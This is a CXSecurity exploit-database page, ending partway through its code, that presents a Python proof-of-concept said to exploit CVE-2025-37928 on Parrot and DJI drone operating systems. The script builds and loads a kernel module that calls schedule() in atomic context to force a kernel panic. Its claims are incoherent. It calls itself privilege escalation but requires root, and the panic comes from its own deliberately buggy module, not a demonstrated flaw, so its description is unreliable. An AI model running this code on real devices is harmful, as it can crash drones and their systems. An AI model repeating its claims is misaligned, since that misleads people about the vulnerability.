---
title: Parrot and DJI variants Drone OSes Kernel Panic Exploit
url: https://cxsecurity.com/issue/WLB-2025060026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-27
fetch_date: 2025-10-06T22:47:53.056937
---

# Parrot and DJI variants Drone OSes Kernel Panic Exploit

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Parrot and DJI variants Drone OSes Kernel Panic Exploit** **2025.06.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-37928](https://cxsecurity.com/cveshow/CVE-2025-37928/ "Click to see CVE-2025-37928")**  CWE: **[CWE-284](https://cxsecurity.com/cwe/CWE-284 "Click to see CWE-284")** | |

#!/usr/bin/env python3
# Exploit Title: Parrot and DJI variants Drone OSes - Kernel Panic Exploit
# Author: Mohammed Idrees Banyamer
# Instagram: @banyamer\_security
# GitHub: https://github.com/mbanyamer
# Date: 2025-06-10
# Tested on: Parrot QRD, Parrot Alpha-M, DJI QRD, DJI Alpha-M
# CVE: CVE-2025-37928
# Type: Local Privilege Escalation / Kernel Panic
# Platform: Linux-based drone OS (Parrot and DJI variants)
# Author Country: Jordan
# CVSS v3.1 Score: 7.3 (Important)
# Weakness: CWE-284: Improper Access Control
# Attack Vector: Local
# User Interaction: None
# Scope: Unchanged
# Confidentiality, Integrity, Availability Impact: High (Denial of Service via Kernel Panic)
# Exploit Code Maturity: Proof of Concept
# Remediation Level: Official Fix Available
#
# Description:
# This PoC triggers a kernel panic by calling schedule() inside an atomic context,
# exploiting CVE-2025-37928 present in certain Linux kernels running on
# Parrot QRD, Parrot Alpha-M, DJI QRD, and DJI Alpha-M drone operating systems.
#
# Steps of exploitation:
# 1. Check if running as root.
# 2. Verify kernel version vulnerability.
# 3. Detect drone type from system files.
# 4. Build and load vulnerable kernel module.
# 5. Trigger kernel panic by scheduling a tasklet calling schedule() in atomic context.
#
# Affected Drone Versions:
# - Parrot QRD
# - Parrot Alpha-M (DT)
# - DJI QRD
# - DJI Alpha-M (DT)
#
# ------------------------------------------------------------------------------
# Usage:
# sudo python3 cve\_2025\_37928\_tool.py [OPTIONS]
#
# Options:
# --dry-run Run detection & build only (no module loading)
# --force Force exploit even if kernel not detected as vulnerable
# --cleanup-only Remove the kernel module without triggering panic
# --verbose Enable detailed logging and debug output
# --help Show usage information
#
# Examples:
# sudo python3 cve\_2025\_37928\_tool.py --dry-run
# sudo python3 cve\_2025\_37928\_tool.py
# sudo python3 cve\_2025\_37928\_tool.py --force
# sudo python3 cve\_2025\_37928\_tool.py --cleanup-only
#
# Warning:
# This PoC causes an immediate kernel panic.
# Use it ONLY in isolated and controlled environments (e.g., lab tests).
# ------------------------------------------------------------------------------
import os
import sys
import subprocess
import tempfile
import argparse
import shutil
import platform
MODULE\_NAME = "cve\_2025\_37928\_poc"
C\_FILENAME = MODULE\_NAME + ".c"
KO\_FILENAME = MODULE\_NAME + ".ko"
KERNEL\_MODULE\_CODE = r'''
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/sched.h>
MODULE\_LICENSE("GPL");
MODULE\_AUTHOR("PoC Author");
MODULE\_DESCRIPTION("PoC for CVE-2025-37928: schedule() in atomic context causes kernel panic");
static void trigger\_panic\_tasklet(unsigned long data)
{
pr\_alert("[CVE-2025-37928] Executing schedule() inside atomic context. This will panic!\n");
schedule(); // This causes kernel panic
}
DECLARE\_TASKLET(my\_tasklet, trigger\_panic\_tasklet, 0);
static int \_\_init poc\_init(void)
{
pr\_info("[CVE-2025-37928] Loading PoC module and scheduling tasklet...\n");
tasklet\_schedule(&my\_tasklet);
return 0;
}
static void \_\_exit poc\_exit(void)
{
tasklet\_kill(&my\_tasklet);
pr\_info("[CVE-2025-37928] PoC module unloaded\n");
}
module\_init(poc\_init);
module\_exit(poc\_exit);
'''
MAKEFILE\_CONTENT = f'''
obj-m += {MODULE\_NAME}.o
all:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
'''
def check\_root():
if os.geteuid() != 0:
print("[-] Must be run as root.")
sys.exit(1)
def detect\_kernel():
version = platform.release()
vulnerable\_versions = ["5.10", "5.15", "6.0"]
vulnerable = any(v in version for v in vulnerable\_versions)
print(f"[i] Kernel version: {version} => {'VULNERABLE' if vulnerable else 'UNKNOWN/SAFE'}")
return vulnerable
def detect\_drone\_type():
print("[\*] Detecting drone type...")
files = ["/etc/drone\_type", "/proc/device-tree/model", "/sys/firmware/devicetree/base/model"]
found = []
for path in files:
if os.path.exists(path):
try:
with open(path, "r") as f:
content = f.read().strip()
if any(x in content for x in ["Parrot", "DJI"]):
found.append(content)
except:
continue
if found:
for d in found:
print(f" [i] Found: {d}")
else:
print(" [!] No drone ID found.")
return found
def write\_module(tempdir):
c\_path = os.path.join(tempdir, C\_FILENAME)
makefile\_path = os.path.join(tempdir, "Makefile")
with open(c\_path, "w") as f:
f.write(KERNEL\_MODULE\_CODE)
with open(makefile\_path, "w") as f:
f.write(MAKEFILE\_CONTENT)
return c\_path
def build\_module(tempdir):
print("[\*] Building module...")
result = subprocess.run(["make"], cwd=tempdir, capture\_output=True, text=True)
if result.returncode != 0:
print("[-] Build failed:\n", result.stderr)
sys.exit(1)
print("[+] Build successful.")
return os.path.join(tempdir, KO\_FILENAME)
def load\_module(ko\_path):
print("[\*] Loading kernel module...")
result = subprocess.run(["insmod", ko\_path], capture\_output=True, text=True)
if result.returncode != 0:
print("[-] insmod failed:\n", result.stderr)
sys.exit(1)
print("[!] Module loaded. Kernel panic should occur if vulnerable.")
def unload\_module():
print("[\*] Attempting to remove module...")
subprocess.run(["rmmod", MODULE\_NAME], stderr=subprocess.DEVNULL)
print("[+] Module removal attempted.")
def clean\_build(tempdir):
subprocess.run(["make", "clean"], cwd=tempdir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def main():
parser = argparse.ArgumentParser(description="CVE-2025-37928 Kernel Panic Exploit Tool for Drone OSes")
parser.add\_argument("--d...